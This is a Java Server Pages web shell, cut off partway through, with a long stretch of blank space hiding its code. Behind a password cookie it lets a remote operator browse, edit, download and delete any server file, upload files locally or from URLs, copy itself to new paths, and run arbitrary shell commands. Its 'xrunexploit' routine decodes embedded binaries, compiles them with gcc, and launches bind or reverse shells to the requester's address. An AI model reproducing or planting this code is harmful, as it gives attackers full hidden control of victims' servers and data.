<%@ page contentType="text/html"%><%@ page import="java.io.*,java.util.*,java.net.*,java.text.*,sun.misc.*,java.security.*,java.lang.*,java.lang.String" %><%


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 

%><%!

//################# FUNCTION GOES HERE #######################==============================================]

public String getSlash(){

	if(is_win()){

		return "\\";

	}

	return "/";

}

public boolean is_win(){

	if(System.getProperty("os.name").toLowerCase().substring(0,3).equals("win")){

		return true;

	}

	return false;

}

public String xcleanpath(String path){

	if(is_dir(path)){

		String xSlash = getSlash();

		if(path!=null && path.length() > 1){

			while(path.substring(path.length()-1).equals(xSlash)){

				path = path.substring(0,path.length()-1);

			}

			return path + xSlash;

		}

	}

	return path;

}

public String urlencode(String str){

	try{ if(str!=null) return URLEncoder.encode(str); } catch(Exception e){ }

	return str;

}

public String urldecode(String str){

	try{ if(str!=null) return URLDecoder.decode(str); } catch(Exception e){ }

	return str;

}

public String xparsedir(String dir){

	String xSlash = "";

	String xSlash_ = "";

	if(is_win()){

		xSlash = "\\";

		xSlash_ = "\\\\";

	}

	else{

		xSlash = "/";

		xSlash_ = "/";

	}

	String[] dirs = dir.split(xSlash_);

	StringBuffer buff = new StringBuffer("");

	StringBuffer dlink = new StringBuffer("");

	if(!is_win()){

		dlink.append(urlencode(xSlash));

		buff.append("<a href=\"?dir=" + dlink + "\">" + xSlash + "</a>&nbsp;");

	}

	for(int i=0;i<dirs.length;i++){

		String d = dirs[i].trim();

		if(!d.equals("")){

			dlink.append(urlencode(d + xSlash));

			buff.append("<a href=\"?dir=" + dlink + "\">" + d + " " + xSlash + "</a>&nbsp;");

		}

	}

	return "<span class=\"gaul\">[ </span>" + buff + "<span class=\"gaul\"> ]</span>";

}

public boolean is_file(String fpath){

	try{

		File myfile = new File(fpath);

		if(myfile.exists() && myfile.isFile()){	return true; }

	}

	catch(Exception e){  }

		return false;

}

public boolean is_dir(String fpath){

	try{

		File myfile = new File(fpath);

		if(myfile.exists() && myfile.isDirectory()){	return true; }

	}

	catch(Exception e){  }

		return false;

}

public String xparentfolder(String fpath){

	if(is_dir(fpath)){

		File myfile = new File(fpath);

		if(myfile.getParent()!=null) return myfile.getParent();

		else return fpath;

	}

	return fpath;

}

public String xfileopen(String fpath){

	try{

		StringBuffer content = new StringBuffer("");

		if(is_file(fpath)){

			FileInputStream fileinputstream = new FileInputStream(fpath);

			int numberBytes = fileinputstream.available();

			byte bytearray[] = new byte[numberBytes];

			fileinputstream.read(bytearray);

			for(int i = 0; i < numberBytes; i++){

				content.append((char) (bytearray[i]));

			}

			fileinputstream.close();

		}

		return content.toString();

	}

	catch (Exception e) {

	}

	return "";

}

public boolean xfilesave(String fullPath, byte[] bytes){

	try{

		OutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(fullPath));

		InputStream inputStream = new ByteArrayInputStream(bytes);

		int token = -1;

		while((token = inputStream.read()) != -1){

			bufferedOutputStream.write(token);

		}

		bufferedOutputStream.flush();

		bufferedOutputStream.close();

		inputStream.close();

	}

	catch(Exception e){ return false; }

	if(is_file(fullPath)){

		return true;

	}

	return false;

}

public boolean xfilesave(String fullPath, String text){

	Writer writer = null;

	try{

		File myFile = new File(fullPath);

		writer = new BufferedWriter(new FileWriter(myFile));

		writer.write(text);

		writer.close();

	}

	catch (Exception e)  { return false; }

	if(is_file(fullPath)){

		return true;

	}

	return false;

}

public void xrmdir(String fdir){

	File mypath = new File(fdir);



	File[] allitem = mypath.listFiles();

	for(int i=0;i<allitem.length;i++){

		if(allitem[i].isDirectory()){

			xrmdir(allitem[i].getAbsolutePath());

		}

		else{

			allitem[i].delete();

		}

	}

	mypath.delete();

}

public long xfilesize(String fpath){

	if(is_file(fpath)){

		File myfile = new File(fpath);

		return myfile.length();

	}

	return 0;

}

public String xparsefilesize(long size_){

	NumberFormat pola = new DecimalFormat("#.00");

	Double pecahan = null;

	Double size = (double) size_;

	if(size <= 1024) {

		return size.toString().replace(".0","");

	}

	else{

		if(size <= 1024*1024) {

			pecahan = ((double) size) / 1024;

			return pola.format(pecahan).replace(",",".") + " kb";

		}

		else {

			pecahan = ((double)  size) / 1024 / 1024;

			return pola.format(pecahan).replace(",",".") + " mb";

		}

	}

}

public String xfileperms(String fpath){

	String isreadable = "-";

	String iswriteable = "-";

	File myd = new File(fpath);

	if(myd.canRead()) isreadable = "r";

	if(myd.canWrite()) iswriteable = "w";

	return isreadable + " / " + iswriteable;

}

public String xdrive(){

	File roots[] = File.listRoots();

	String letter = "";

	if(is_win()){

		StringBuffer letters = new StringBuffer("");

		for(int i=0;i<roots.length;i++){

			letter = roots[i].toString();

			letters.append("<a href=\"?dir=" + letter + "\"><span class=\"gaul\">[ </span>");

			letters.append(letter.substring(0,1));

			letters.append("<span class=\"gaul\"> ]</span</a>&nbsp;");

		}

		letters.append("<br />");

		return letters.toString();

	}

	return "";

}

public String xfilelastmodified(String fpath){

	if(is_file(fpath) || is_dir(fpath)){

		File myfile = new File(fpath);

		return new SimpleDateFormat("dd-MMM-yyyy HH:mm").format(new java.util.Date(myfile.lastModified()));

	}

	return "???";

}

public String xfilesummary(String fpath){

	if(is_file(fpath)){

		return "Filesize : " + xparsefilesize(xfilesize(fpath)) + " ( " + xfilesize(fpath) + " ) <span class=\"gaul\"> :: </span>Permission : " + xfileperms(fpath) + " <span class=\"gaul\"> :: </span>modified : " + xfilelastmodified(fpath);

	}

	return "";

}

public boolean xrunexploit(String fpath,String base64,String port,String ip){

	String finals = "";

	byte[] embrio = b64decode(base64);

	String tmpdir = xcleanpath(System.getProperty("java.io.tmpdir"));

	String fname = "";

	String xpath = "";

	boolean ok = false;

	if(is_win()){

		fname = "bd.exe";

		xpath = xcleanpath(fpath) + fname;

		if(is_file(xpath)){

			File xfile = new File(xpath);

			xfile.delete();



		}

		if(!xfilesave(xpath,embrio)){

			xpath = tmpdir + fname;

			if(xfilesave(xpath,embrio)) ok = true;

		}

		else ok = true;



		if(ok){

			finals = xpath + " " + port + " " + ip;

			try {

				Process p = Runtime.getRuntime().exec(finals);

			}

			catch(Exception e) { return false; }

			return true;

		}

	}

	else {

		if(!ip.equals("")) fname = "back";

		else fname = "bind";

		String ypath = xcleanpath(fpath) + fname;

		if(is_file(ypath + ".c")){

			File yfile = new File(xpath + ".c");

			yfile.delete();

		}

		if(!xfilesave(ypath + ".c",embrio)){

			xpath = tmpdir + fname;

			if(xfilesave(xpath,embrio)) ok = true;

		}

		else ok = true;



		if(ok){

			ekse("gcc " + ypath + ".c -o " + ypath,fpath );

			ekse("chmod +x " + ypath,fpath);

			if(is_file(ypath)){

				finals = ypath + " " + port + " " + ip;

				try{

					Process p = Runtime.getRuntime().exec(finals);

				}

				catch(Exception e){ return false; }

				return true;

			}

			else return false;

		}

	}

	return false;

}

String ekse(String cmd, String cwd){

	String[] comm = new String[3];

	if(!is_win()){

		comm[0] = "/bin/sh";comm[1] = "-c";comm[2] = cmd;

	}else{

		comm[0] = "cmd";comm[1] = "/C";comm[2] = cmd;

	}

	StringBuffer ret = new StringBuffer();

	long start = System.currentTimeMillis();

	try {

		Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));

		//Get input and error streams

		BufferedInputStream ls_in = new BufferedInputStream(ls_proc.getInputStream());

		BufferedInputStream ls_err = new BufferedInputStream(ls_proc.getErrorStream());

		boolean end = false;

		while (!end) {

			int c = 0;

			while ((ls_err.available() > 0) && (++c <= 1000)) {

				ret.append((char) ls_err.read());

			}

			c = 0;

			while ((ls_in.available() > 0) && (++c <= 1000)) {

				ret.append((char) ls_in.read());

			}

			try {

				ls_proc.exitValue();

				//if the process has not finished, an exception is thrown

				//else

				while (ls_err.available() > 0)

					ret.append((char) ls_err.read());

				while (ls_in.available() > 0)

					ret.append((char) ls_in.read());

				end = true;

			}

			catch (IllegalThreadStateException ex) {

				//Process is running

			}

			try {

				Thread.sleep(50);

			}

			catch (InterruptedException ie) {}

		}

	}

	catch (IOException e) {

		ret.append("Error: " + e);

	}

	return ret.toString();

}

public String xdir(String fdir){

	String path = xcleanpath(urldecode(fdir));

	StringBuffer buff = new StringBuffer("");

	if(is_dir(path)){

		File mypath = new File(fdir);

		ArrayList fname = new ArrayList();

		ArrayList dname = new ArrayList();



		String[] allitem = mypath.list();

		for(int i=0;i<allitem.length;i++){

			String checkthis = allitem[i].toString();

			if(is_dir(path + checkthis)){

				dname.add(checkthis);

			}

			else{

				fname.add(checkthis);

			}

		}

		Collections.sort(fname, new myComparator());

		Collections.sort(dname, new myComparator());



		buff.append("<div id=\"explorer\"><table class=\"tblExplorer\">" +

		"<tr><th>Filename</th>" +

		"<th style=\"width:80px;\">Filesize</th>" +

		"<th style=\"width:80px;\">Permission</th>" +

		"<th style=\"width:150px;\">Last Modified</th>" +

		"<th style=\"width:180px;\">Action</th></tr>");



		if (path.length() > 3){

			String sd = ".";

			String d = xcleanpath(path);

			String nextdir = xcleanpath(xparentfolder(d));

			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(d) + "';\">");

			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + d + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");

			buff.append("<td>DIR</td>");

			buff.append("<td style=\"text-align:center;\">" + xfileperms(d) + "</td>");

			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(d) + "</td>");

			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + path + "&properties=" + d + "\">Properties</a> | <a href=\"?dir=" + nextdir + "&del=" + d + "\">Remove</a></td>");

			buff.append("</tr>");

			sd = "..";

			d = xcleanpath(xparentfolder(path));

			nextdir = xcleanpath(xparentfolder(d));

			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(d) + "';\">");

			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + d + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");

			buff.append("<td>DIR</td>");

			buff.append("<td style=\"text-align:center;\">" + xfileperms(d) + "</td>");

			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(d) + "</td>");

			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + d + "&properties=" + d + "\">Properties</a> | <a href=\"?dir=" + nextdir + "&del=" + d + "\">Remove</a></td>");

			buff.append("</tr>");

		}

		for(int i=0;i<dname.size();i++){

			String sd = dname.get(i).toString().trim().replace("\\","\\\\");

			String d = path + sd.trim();

			String nextdir = xcleanpath(d);

			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(nextdir) + "';\">");

			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + nextdir + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");

			buff.append("<td>DIR</td>");

			buff.append("<td style=\"text-align:center;\">" + xfileperms(nextdir) + "</td>");

			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(nextdir) + "</td>");

			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + path + "&properties=" + nextdir + "\">Properties</a> | <a href=\"?dir=" + path + "&del=" + xcleanpath(nextdir) + "\">Remove</a></td>");

			buff.append("</tr>");

		}

		for(int i=0;i<fname.size();i++){

			String sf = fname.get(i).toString().trim();

			String f = path + sf;

			String view = "?dir=" + urlencode(path) + "&view=" + urlencode(f);

			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location='?dir=" + urlencode(xcleanpath(path)) + "&properties=" + urlencode(f) + "';\"><td>");

			buff.append("<a href=\"?dir=" + urlencode(xcleanpath(path)) + "&properties=" + urlencode(f) + "\">");

			buff.append(sf + "</a></td>");

			buff.append("<td>" + xparsefilesize(xfilesize(f)) + "</td>");

			buff.append("<td style=\"text-align:center;\">" + xfileperms(f) + "</td>");

			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(f) + "</td>");

			buff.append("<td style=\"text-align:center;\"><a href=\"" + view + "\">Edit</a> | <a href=\"?get=" + f + "\">Download</a> | <a href=\"?dir=" + xcleanpath(path) + "&del=" + f + "\">Remove</a></td>");

			buff.append("</tr>");

		}

		buff.append("</table></div>");

	}

	return buff.toString();

}

public boolean is_numeric(String str){

	return str.matches("\\d+");

}

public void chdir(String directory) {

  System.setProperty("user.dir",directory);

}

public byte[] b64decode(String str){

	BASE64Decoder myDec = new BASE64Decoder();

	byte[] decoded = null;

	try{ decoded = myDec.decodeBuffer(str); }

	catch(Exception e){ }

	return decoded;

}

public String htmlspecialchars(String scode){

	StringBuffer sb = new StringBuffer();

	for(int i=0; i<scode.length(); i++) {

		char c = scode.charAt(i);

		switch (c) {

			case '<' 	:sb.append("&lt;");break;

			case '>' 	:sb.append("&gt;");break;

			case '&' 	:sb.append("&amp;");break;

			case '"' 	:sb.append("&quot;");break;

			case '\''	:sb.append("&apos;");break;

			case ' '	:sb.append("&nbsp;");break;

			default		:sb.append(c);

		}

	}

	return sb.toString();

}

public boolean is_image(String fpath){

	FileNameMap fileNameMap = URLConnection.getFileNameMap();

	String contentType = fileNameMap.getContentTypeFor(fpath);

	if(contentType!=null && contentType.toLowerCase().startsWith("image")){ return true; }

	return false;

}

class myComparator implements Comparator {

	public int compare(Object o1, Object o2) {

		String s1 = (String) o1;

		String s2 = (String) o2;

		return s1.toLowerCase().compareTo(s2.toLowerCase());

	}

}

public class FileInfo {

	public String name = null, clientFileName = null, fileContentType = null;

	private byte[] fileContents = null;

	public File file = null;

	public StringBuffer sb = new StringBuffer(100);



	public void setFileContents(byte[] aByteArray) {

		fileContents = new byte[aByteArray.length];

		System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);

	}

}

public class HttpMultiPartParser {

	//private final String lineSeparator = System.getProperty("line.separator", "\n");

	private final int ONE_MB = 1024 * 1;



	public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,

			int clength) throws IllegalArgumentException, IOException {

		if (is == null) throw new IllegalArgumentException("InputStream");

		if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(

				"\"" + boundary + "\" is an illegal boundary indicator");

		boundary = "--" + boundary;

		StringTokenizer stLine = null, stFields = null;

		FileInfo fileInfo = null;

		Hashtable dataTable = new Hashtable(5);

		String line = null, field = null, paramName = null;

		boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);

		boolean isFile = false;

		if (saveFiles) { // Create the required directory (including parent dirs)

			File f = new File(saveInDir);

			f.mkdirs();

		}

		line = getLine(is);

		if (line == null || !line.startsWith(boundary)) throw new IOException(

				"Boundary not found; boundary = " + boundary + ", line = " + line);

		while (line != null) {

			if (line == null || !line.startsWith(boundary)) return dataTable;

			line = getLine(is);

			if (line == null) return dataTable;

			stLine = new StringTokenizer(line, ";\r\n");

			if (stLine.countTokens() < 2) throw new IllegalArgumentException(

					"Bad data in second line");

			line = stLine.nextToken().toLowerCase();

			if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(

					"Bad data in second line");

			stFields = new StringTokenizer(stLine.nextToken(), "=\"");

			if (stFields.countTokens() < 2) throw new IllegalArgumentException(

					"Bad data in second line");

			fileInfo = new FileInfo();

			stFields.nextToken();

			paramName = stFields.nextToken();

			isFile = false;

			if (stLine.hasMoreTokens()) {

				field = stLine.nextToken();

				stFields = new StringTokenizer(field, "=\"");

				if (stFields.countTokens() > 1) {

					if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {

						fileInfo.name = paramName;

						String value = stFields.nextToken();

						if (value != null && value.trim().length() > 0) {

							fileInfo.clientFileName = value;

							isFile = true;

						}

						else {

							line = getLine(is); // Skip "Content-Type:" line

							line = getLine(is); // Skip blank line

							line = getLine(is); // Skip blank line

							line = getLine(is); // Position to boundary line

							continue;

						}

					}

				}

				else if (field.toLowerCase().indexOf("filename") >= 0) {

					line = getLine(is); // Skip "Content-Type:" line

					line = getLine(is); // Skip blank line

					line = getLine(is); // Skip blank line

					line = getLine(is); // Position to boundary line

					continue;

				}

			}

			boolean skipBlankLine = true;

			if (isFile) {

				line = getLine(is);

				if (line == null) return dataTable;

				if (line.trim().length() < 1) skipBlankLine = false;

				else {

					stLine = new StringTokenizer(line, ": ");

					if (stLine.countTokens() < 2) throw new IllegalArgumentException(

							"Bad data in third line");

					stLine.nextToken(); // Content-Type

					fileInfo.fileContentType = stLine.nextToken();

				}

			}

			if (skipBlankLine) {

				line = getLine(is);

				if (line == null) return dataTable;

			}

			if (!isFile) {

				line = getLine(is);

				if (line == null) return dataTable;

				dataTable.put(paramName, line);

				// If parameter is dir, change saveInDir to dir

				if (paramName.equals("dir")) saveInDir = line;

				line = getLine(is);

				continue;

			}

			try {

				OutputStream os = null;

				String path = null;

				if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,

						fileInfo.clientFileName));

				else os = new ByteArrayOutputStream(ONE_MB);

				boolean readingContent = true;

				byte previousLine[] = new byte[2 * ONE_MB];

				byte temp[] = null;

				byte currentLine[] = new byte[2 * ONE_MB];

				int read, read3;

				if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {

					line = null;

					break;

				}

				while (readingContent) {

					if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {

						line = null;

						break;

					}

					if (compareBoundary(boundary, currentLine)) {

						os.write(previousLine, 0, read - 2);

						line = new String(currentLine, 0, read3);

						break;

					}

					else {

						os.write(previousLine, 0, read);

						temp = currentLine;

						currentLine = previousLine;

						previousLine = temp;

						read = read3;

					}//end else

				}//end while

				os.flush();

				os.close();

				if (!saveFiles) {

					ByteArrayOutputStream baos = (ByteArrayOutputStream) os;

					fileInfo.setFileContents(baos.toByteArray());

				}

				else fileInfo.file = new File(path);

				dataTable.put(paramName, fileInfo);

			}//end try

			catch (IOException e) {

				throw e;

			}

		}

		return dataTable;

	}



	/**

	 * Compares boundary string to byte array

	 */

	private boolean compareBoundary(String boundary, byte ba[]) {

		if (boundary == null || ba == null) return false;

		for (int i = 0; i < boundary.length(); i++)

			if ((byte) boundary.charAt(i) != ba[i]) return false;

		return true;

	}



	/** Convenience method to read HTTP header lines */

	private synchronized String getLine(ServletInputStream sis) throws IOException {

		byte b[] = new byte[1024];

		int read = sis.readLine(b, 0, b.length), index;

		String line = null;

		if (read != -1) {

			line = new String(b, 0, read);

			if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);

		}

		return line;

	}



	public String getFileName(String dir, String fileName) throws IllegalArgumentException {

		String path = null;

		if (dir == null || fileName == null) throw new IllegalArgumentException(

				"dir or fileName is null");

		int index = fileName.lastIndexOf('/');

		String name = null;

		if (index >= 0) name = fileName.substring(index + 1);

		else name = fileName;

		index = name.lastIndexOf('\\');

		if (index >= 0) fileName = name.substring(index + 1);

		path = dir + File.separator + fileName;

		if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);

		else return path.replace('/', File.separatorChar);

	}

} //End of class HttpMultiPartParser



Hashtable cookieTable(Cookie[] cookies) {

	Hashtable cookieTable = new Hashtable();

	if (cookies != null) {

		for (int i=0; i < cookies.length; i++)

			cookieTable.put(cookies[i].getName(), cookies[i].getValue());

	}

	return cookieTable;

}



%><%

//################# INIT GOES HERE #######################==================================================]

//String xCwd_ = getServletConfig().getServletContext().getRealPath(request.getRequestURI());

String xCwd_ = getServletConfig().getServletContext().getRealPath(request.getRequestURI());

String xCwd = xCwd_.substring(0,xCwd_.lastIndexOf(getSlash()));

chdir(xCwd);



String result = "";

String check = "";

Hashtable _COOKIE = cookieTable(request.getCookies());

Cookie myCookie;

boolean auth = false;

if((request.getParameter("passw")!=null) && (!request.getParameter("passw").equals(""))){

	check = request.getParameter("passw").trim();

	if(check.equals(shell_password)){

		myCookie = new Cookie("pass",check);

		myCookie.setMaxAge(3600*24*7);

		response.addCookie(myCookie);

	}

	else {

		myCookie = new Cookie("pass","");

		myCookie.setMaxAge(0);

		response.addCookie(myCookie);

	}

}

if(_COOKIE.containsKey("pass")) {

	check = (String) _COOKIE.get("pass");

}



if(check.equals(shell_password)){

	auth = true;

}

else auth = false;





if((request.getParameter("img")!=null) && (!request.getParameter("img").equals(""))){

	String myfile = request.getParameter("img");

	if(is_file(myfile)){

		response.setContentType("image/png");

		OutputStream o = response.getOutputStream();

		FileInputStream fis = new FileInputStream(myfile);

		int i;

		while ((i=fis.read()) != -1){ o.write(i); }

		fis.close();

		o.flush();

		o.close();

		return;

	}

	else{

		String file = "";

		if(myfile.equals("icon")){

			file = icon;

		}

		else if(myfile.equals("bg")){

			file = bg;

		}

		byte[] data = b64decode(file);

		response.setContentType("image/png");

		OutputStream o = response.getOutputStream();

        o.write(data);

		o.flush();

		o.close();

		return;

    }

}

if((request.getParameter("get")!=null) && (!request.getParameter("get").equals(""))){

	String myfile = request.getParameter("get");

	File myfile__ = new File(myfile);

	response.setContentType("application/octet-stream");

	response.setHeader("Content-Disposition","attachment; filename=\"" + myfile__.getName() + "\"");

	OutputStream o = response.getOutputStream();

	FileInputStream fis = new FileInputStream(myfile);

	int i;

	while ((i=fis.read()) != -1){ o.write(i); }

	fis.close();o.flush();o.close();

	return;

}





if((request.getParameter("dir")!=null) && (!request.getParameter("dir").equals(""))){

	String newdir = xcleanpath(urldecode(request.getParameter("dir").trim()));

	if((request.getParameter("oldfilename")!=null) && (!request.getParameter("oldfilename").equals(""))){

		if((request.getParameter("properties")!=null) && (!request.getParameter("properties").equals(""))){

			newdir = xcleanpath(xparentfolder(request.getParameter("oldfilename")));

		}

	}

	if(is_dir(newdir)){

		chdir(newdir);

		xCwd = newdir;

	}

	else if(is_file(newdir)){

		newdir = newdir.substring(0,newdir.lastIndexOf(getSlash()));

		if(is_dir(newdir)){

			chdir(newdir);

			xCwd = newdir;

		}

	}



	if((request.getParameter("foldername")!=null) && (!request.getParameter("foldername").equals(""))){

		File myFile = new File(xcleanpath(xCwd + request.getParameter("foldername")));

		if(!myFile.exists()) myFile.mkdir();

	}

	else if((request.getParameter("del")!=null) && (!request.getParameter("del").equals(""))){

		String fdel = request.getParameter("del");

		if(is_file(fdel)) new File(fdel).delete();

		else if(is_dir(fdel)){

			xrmdir(fdel);

			xCwd = xcleanpath(newdir);

		}

	}

	else if((request.getParameter("childname")!=null) && (!request.getParameter("childname").equals(""))){

		String childname = request.getParameter("childname").trim();

		String ortu = getServletConfig().getServletContext().getRealPath(request.getRequestURI());

		String con = xfileopen(ortu);

		xfilesave(xCwd+childname,con);

	}

}



if((request.getParameter("btnConnect")!=null) && (!request.getParameter("btnConnect").equals(""))){

	if((request.getParameter("bportC")!=null) && (is_numeric(request.getParameter("bportC")))){

		String port = request.getParameter("bportC");

		String base64 = "";

		if(is_win()) base64 = wBind;

		else base64 = xBack;

		if(xrunexploit(xCwd,base64,port,request.getRemoteAddr())){

		}

	}

}

else if((request.getParameter("btnListen")!=null) && (!request.getParameter("btnListen").equals(""))){

	if((request.getParameter("lportC")!=null) && (is_numeric(request.getParameter("lportC")))){

		String port = request.getParameter("lportC");

		String base64 = "";

		if(is_win()) base64 = wBind;

		else base64 = xBind;

		if(xrunexploit(xCwd,base64,port,"")){

		}

	}

}







if ((request.getContentType() != null)	&& (request.getContentType().toLowerCase().startsWith("multipart"))) {

	HttpMultiPartParser myParser = new HttpMultiPartParser();

	try{

		int bstart = request.getContentType().lastIndexOf("oundary=");

		String bound = request.getContentType().substring(bstart + 8);

		int clength = request.getContentLength();

		Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);

		if(ht.get("btnNewUploadUrl")!=null && !ht.get("btnNewUploadUrl").equals("")){

			if(ht.get("fileurl")!=null && !ht.get("fileurl").equals("")){

				URL myUrl = new URL(ht.get("fileurl").toString());

				URLConnection myCon = myUrl.openConnection();

				int conLength = myCon.getContentLength();

				InputStream raw = myCon.getInputStream();

				InputStream in = new BufferedInputStream(raw);

				byte[] data = new byte[conLength];

				int bytesRead = 0;

				int offset = 0;

				while(offset < conLength){

					bytesRead = in.read(data, offset, data.length - offset);

					if(bytesRead == -1) break;

					offset += bytesRead;

				}

				in.close();

				if(offset == conLength){

					String fname = myUrl.getFile();

					fname = fname.substring(fname.lastIndexOf('/')+1);

					if(ht.get("filename")!=null && !ht.get("filename").equals("")){

						fname = ht.get("filename").toString().trim();

					}

					FileOutputStream ooo = new FileOutputStream(xCwd + fname);

					ooo.write(data);ooo.flush();ooo.close();

				}

			}

		}

		else if(ht.get("btnNewUploadLocal")!=null && !ht.get("btnNewUploadLocal").equals("")){

			FileInfo fi = (FileInfo) ht.get("filelocal");

			String clientFileName = xCwd + fi.clientFileName.trim();

			if(ht.get("filename")!=null && !ht.get("filename").equals("")){

				String filename = xCwd + ht.get("filename").toString().trim();

				File clientFile = new File(clientFileName);

				clientFile.renameTo(new File(filename));

			}

		}

	}

	catch(Exception e){  }

}



if((request.getParameter("cmd")!=null) && (!request.getParameter("cmd").equals(""))){

	String cmd = urldecode(request.getParameter("cmd"));

	String newdir = "";

	if(cmd.toLowerCase().startsWith("cd ")){

		newdir = cmd.substring(3).trim();

		if(is_win()) newdir = newdir.replace("/","\\");

		if(newdir.equals("\\") && xCwd.length()>=3){ xCwd = xCwd.substring(0,3); }

		else if(newdir.equals(".")) { }

		else if(newdir.equals("..")) {

			xCwd = xcleanpath(xparentfolder(xCwd));

		}

		else{

			if(newdir.indexOf(":") > 0){

				if(is_dir(newdir)){	xCwd = xcleanpath(newdir); }

			}

			else if(is_dir(newdir)){

				xCwd = xcleanpath(newdir);

			}

			else{

				if(is_dir(xCwd + newdir)) { xCwd = xcleanpath(xCwd + newdir); }

			}

		}

		result = xdir(xCwd);

	}

	else if(cmd.matches("^\\w{1}:.*")){

		if(is_dir(cmd)){ xCwd = xcleanpath(cmd); }

		result = xdir(xCwd);

	}

	else {

		String result_ = htmlspecialchars(ekse(cmd,xCwd));

		if(!result_.equals("")) result = result_.replace("\n","<br />");

		else {

			result = xdir(xCwd);

		}

	}

	chdir(xCwd);

}

else if((request.getParameter("properties")!=null) && (!request.getParameter("properties").equals(""))){

	String fname = xcleanpath(urldecode(request.getParameter("properties")));

	String oldname = "";

	if((request.getParameter("oldfilename")!=null) && (!request.getParameter("oldfilename").equals(""))){

		oldname = request.getParameter("oldfilename");

		File oldfile = new File(oldname);

		oldfile.renameTo(new File(fname));

	}

	String dir = xCwd;

	String fcont = "";

	String fview = "";

	String fsize = "";

	String faction = "";

	String type = "";

	if(is_dir(fname)){

		fsize = "DIR";

		fcont = xdir(fname);

		faction = "<a href=\"?dir=" + xcleanpath(fname) + "&properties=" + xcleanpath(fname) + "\">Properties</a> | <a href=\"?dir=" + xcleanpath(xparentfolder(fname)) + "&del=" + xcleanpath(fname) + "\">Remove</a>";

	}

	else{

		fsize = xparsefilesize(xfilesize(fname)) + " <span class=\"gaul\">( </span>" + xfilesize(fname) + " bytes<span class=\"gaul\"> )</span>";

		if((request.getParameter("type")!=null) && (!request.getParameter("type").equals(""))) type = request.getParameter("type").trim();

		else{

			if(is_image(fname)) type = "img";

			else type = "text";

		}

		if(type.equals("img")){

